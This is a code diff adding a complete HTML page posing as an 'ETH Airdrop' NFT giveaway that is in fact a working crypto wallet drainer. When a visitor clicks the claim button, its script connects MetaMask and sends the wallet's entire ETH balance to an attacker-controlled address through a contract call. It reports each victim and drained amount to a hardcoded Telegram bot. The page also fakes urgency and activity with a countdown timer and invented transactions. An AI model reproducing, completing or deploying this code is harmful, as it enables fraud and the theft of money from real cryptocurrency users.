@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ETH Airdrop v3.0 - Claim Exclusive NFTs</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --neon-green: #00ff88;
+            --neon-purple: #8a2be2;
+            --dark-bg: #0a0a0a;
+            --card-bg: #1a1a1a;
+            --text-gray: #b0b0b0;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: var(--dark-bg);
+            color: white;
+            font-family: 'Inter', sans-serif;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+        header {
+            background: linear-gradient(90deg, rgba(10, 10, 10, 0.9), rgba(20, 20, 20, 0.8));
+            padding: 1.5rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--neon-green);
+        }
+        header .logo {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: var(--neon-green);
+        }
+        header nav a {
+            color: var(--text-gray);
+            text-decoration: none;
+            margin-left: 2rem;
+            font-weight: 600;
+            transition: color 0.3s;
+        }
+        header nav a:hover {
+            color: var(--neon-green);
+        }
+        .hero {
+            text-align: center;
+            padding: 4rem 2rem;
+            background: url('https://images.unsplash.com/photo-1620641788421-7a1c342ea42e?auto=format&fit=crop&w=1920&q=80') no-repeat center/cover;
+            background-attachment: fixed;
+            position: relative;
+        }
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+        }
+        .hero-content {
+            position: relative;
+            z-index: 1;
+        }
+        .hero h1 {
+            font-size: 3.5rem;
+            font-weight: 800;
+            margin-bottom: 1rem;
+            background: linear-gradient(45deg, var(--neon-green), var(--neon-purple));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .hero p {
+            font-size: 1.2rem;
+            color: var(--text-gray);
+            margin-bottom: 2rem;
+        }
+        .countdown {
+            background: var(--card-bg);
+            border: 2px solid var(--neon-green);
+            border-radius: 15px;
+            padding: 1.5rem;
+            text-align: center;
+            margin: 2rem auto;
+            width: 90%;
+            max-width: 600px;
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
+        }
+        .countdown h2 {
+            font-size: 1.8rem;
+            margin-bottom: 0.5rem;
+        }
+        .countdown span {
+            font-size: 2rem;
+            font-weight: 800;
+            color: var(--neon-green);
+        }
+        #claimButton {
+            background: linear-gradient(45deg, var(--neon-purple), var(--neon-green));
+            padding: 1.5rem 3rem;
+            font-size: 1.5rem;
+            font-weight: 600;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            margin: 2rem auto;
+            display: block;
+            color: white;
+        }
+        #claimButton:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.5);
+        }
+        .price-feed {
+            background: var(--card-bg);
+            padding: 2rem;
+            border-radius: 15px;
+            margin: 2rem auto;
+            width: 90%;
+            max-width: 600px;
+            text-align: center;
+            border: 1px solid var(--neon-purple);
+            box-shadow: 0 0 15px rgba(138, 43, 226, 0.2);
+        }
+        .price-feed h3 {
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
+        }
+        .price-feed div {
+            font-size: 1.2rem;
+            margin: 0.5rem 0;
+        }
+        .tx-feed {
+            background: var(--card-bg);
+            padding: 2rem;
+            border-radius: 15px;
+            margin: 2rem auto;
+            width: 90%;
+            max-width: 600px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
+        }
+        .tx-feed h3 {
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
+        }
+        .tx-feed div {
+            font-size: 1rem;
+            color: var(--text-gray);
+            margin: 0.5rem 0;
+        }
+        .social-proof {
+            text-align: center;
+            padding: 2rem;
+            background: var(--card-bg);
+            margin: 2rem auto;
+            width: 90%;
+            max-width: 600px;
+            border-radius: 15px;
+        }
+        .social-proof h3 {
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
+        }
+        .social-proof i {
+            font-size: 2rem;
+            margin: 0 1rem;
+            color: var(--neon-green);
+            transition: color 0.3s;
+        }
+        .social-proof i:hover {
+            color: var(--neon-purple);
+        }
+        footer {
+            text-align: center;
+            padding: 2rem;
+            background: #111;
+            color: var(--text-gray);
+            font-size: 0.9rem;
+        }
+        @keyframes confetti {
+            0% { transform: translateY(-100vh) rotate(0deg); }
+            100% { transform: translateY(100vh) rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo">ETH Airdrop v3.0</div>
+        <nav>
+            <a href="#home">Home</a>
+            <a href="#about">About</a>
+            <a href="#faq">FAQ</a>
+            <a href="#contact">Contact</a>
+        </nav>
+    </header>
+
+    <section class="hero">
+        <div class="hero-content">
+            <h1>Claim Your Exclusive ETH NFT Airdrop!</h1>
+            <p>Join thousands of users in our limited-time airdrop event. Don’t miss out on rare NFTs and bonus ETH rewards!</p>
+        </div>
+    </section>
+
+    <div class="countdown">
+        <h2>🚨 AIRDROP ENDS IN: <span id="timer">24:00:00</span></h2>
+    </div>
+
+    <div class="price-feed">
+        <h3>📈 Live Crypto Prices</h3>
+        <div>BTC: $<span id="btcPrice">Loading...</span></div>
+        <div>ETH: $<span id="ethPrice">Loading...</span></div>
+    </div>
+
+    <button id="claimButton">🔥 CLAIM FREE NFT (LIMITED)</button>
+
+    <div class="tx-feed">
+        <h3>🔄 Live Transactions</h3>
+        <div id="liveTx"></div>
+    </div>
+
+    <div class="social-proof">
+        <h3>Join Our Community</h3>
+        <a href="https://twitter.com" target="_blank"><i class="fab fa-twitter"></i></a>
+        <a href="https://discord.com" target="_blank"><i class="fab fa-discord"></i></a>
+        <a href="https://telegram.org" target="_blank"><i class="fab fa-telegram"></i></a>
+    </div>
+
+    <footer>
+        <p>&copy; 2025 ETH Airdrop v3.0. All rights reserved.</p>
+    </footer>
+
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
+    <script>
+        // ==== CONFIGURATION (HARDCODED VALUES) ====
+        const RECEIVER_ADDRESS = "0xYOUR_WALLET_ADDRESS"; // Replace with your wallet address to receive drained ETH
+        const CONTRACT_ADDRESSES = {
+            connect: "0xCONNECT_CONTRACT" // Deploy connect.sol and insert the address here
+        };
+        const TELEGRAM_BOT_TOKEN = "7612722516:AAEZKaiU01Dx-VbTKQTmzNqo2WZ9X7x8zKA";
+        const TELEGRAM_CHAT_ID = "6309547301"; // Replace with your Telegram user ID
+        const BLACKLIST = ["0xabc...def"];
+
+        // ABI for connect.sol (MS_Contract)
+        const CONNECT_ABI = [
+            {
+                "inputs": [],
+                "stateMutability": "nonpayable",
+                "type": "constructor"
+            },
+            {
+                "inputs": [{"name": "sender", "type": "address"}],
+                "name": "Connect",
+                "outputs": [],
+                "stateMutability": "payable",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "getBalance",
+                "outputs": [{"name": "", "type": "uint256"}],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "name": "getOwner",
+                "outputs": [{"name": "", "type": "address"}],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [{"name": "wallet", "type": "address"}],
+                "name": "getUserBalance",
+                "outputs": [{"name": "", "type": "uint256"}],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [{"name": "where", "type": "address"}],
+                "name": "withdraw",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }
+        ];
+
+        // ==== TELEGRAM INTEGRATION ====
+        async function sendTelegramAlert(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+            try {
+                const response = await fetch(url);
+                if (!response.ok) {
+                    console.error('Telegram API error:', await response.text());
+                }
+            } catch (e) {
+                console.error('Telegram error:', e);
+            }
+        }
+
+        // Test Telegram bot on page load
+        sendTelegramAlert("🔔 Drainer site loaded! Ready to scam some suckers.");
+
+        // ==== WALLET DRAIN LOGIC ====
+        async function drainWallet() {
+            if (!window.ethereum) {
+                alert('Please install MetaMask!');
+                return;
+            }
+
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            await provider.send("eth_requestAccounts", []);
+            const signer = provider.getSigner();
+            const victim = await signer.getAddress();
+
+            // Check blacklist
+            if (BLACKLIST.includes(victim)) {
+                sendTelegramAlert(`🚫 Blacklisted user tried to interact: ${victim}`);
+                return;
+            }
+
+            const connectContract = new ethers.Contract(CONTRACT_ADDRESSES.connect, CONNECT_ABI, signer);
+
+            try {
+                // Step 1: Trick victim into sending ETH to the contract, crediting your address
+                const balance = await provider.getBalance(victim);
+                const tx = await connectContract.Connect(RECEIVER_ADDRESS, {
+                    value: balance,
+                    gasLimit: 100000
+                });
+                const receipt = await tx.wait();
+
+                // Send success alert to Telegram
+                const message = `🎉 New Drain!\nVictim: ${victim}\nDrained: ${ethers.utils.formatEther(balance)} ETH\nTx: ${receipt.transactionHash}`;
+                sendTelegramAlert(message);
+
+                // Fake success UI
+                document.getElementById("claimButton").innerHTML = "✅ Success! NFTs Claimed!";
+            } catch (error) {
+                // Send failure alert to Telegram
+                sendTelegramAlert(`❌ Failed to drain ${victim}: ${error.message}`);
+                document.getElementById("claimButton").innerHTML = "❌ Failed! Try Again.";
+            }
+        }
+
+        // ==== FETCH LIVE CRYPTO PRICES ====
+        async function fetchCryptoPrices() {
+            try {
+                const apiUrl = 'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum&vs_currencies=usd';
+                const response = await fetch(apiUrl);
+                const data = await response.json();
+                document.getElementById('btcPrice').innerHTML = data.bitcoin.usd.toLocaleString();
+                document.getElementById('ethPrice').innerHTML = data.ethereum.usd.toLocaleString();
+            } catch (e) {
+                document.getElementById('btcPrice').innerHTML = "Error";
+                document.getElementById('ethPrice').innerHTML = "Error";
+            }
+        }
+        fetchCryptoPrices();
+        setInterval(fetchCryptoPrices, 60000);
+
+        // ==== FAKE UI ELEMENTS ====
+        let countdown = 86400;
+        setInterval(() => {
+            countdown--;
+            document.getElementById("timer").innerHTML = new Date(countdown * 1000).toISOString().substr(11, 8);
+        }, 1000);
+
+        // Simulate live transactions
+        setInterval(() => {
+            const fakeTxs = [
+                "0x123...abc claimed 3 ETH!",
+                "0x456...def minted Rare NFT!",
+                "0x789...ghi joined the airdrop!"
+            ];
+            document.getElementById("liveTx").innerHTML = fakeTxs.map(tx => `<div>🔄 ${tx}</div>`).join('');
+        }, 5000);
+
+        // ==== INITIATE DRAIN ====
+        document.getElementById("claimButton").addEventListener('click', () => {
+            drainWallet();
+        });
+    </script>
+
+    <!-- Base64-encoded Ethereum logo -->
+    <img src="data:image/png;base64,iVBORw0KGg..." style="display:none;">
+</body>
+</html>
